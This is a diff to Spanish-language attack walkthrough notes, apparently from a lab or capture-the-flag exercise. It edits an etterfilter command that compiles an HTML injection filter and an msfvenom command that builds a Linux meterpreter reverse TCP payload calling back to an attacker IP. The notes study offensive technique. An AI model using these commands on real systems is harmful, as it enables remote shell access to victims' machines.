@@ -814,7 +814,7 @@ Desde el atacante:
 chmod +x origen_shell
 ```
 ```
-etterfilter html_!.filter -o prueba_filter_1.ef
+etterfilter html_1.filter -o prueba_filter_1.ef
 ```
 
 
@@ -823,7 +823,7 @@ msfconsole
 ```
 
 ```
-msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.48.207 lport=1234 -f elf -o origen_shell_1
+msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.48.207 lport=1234 -f elf -o origen_shell_prueba
 ```
 
 
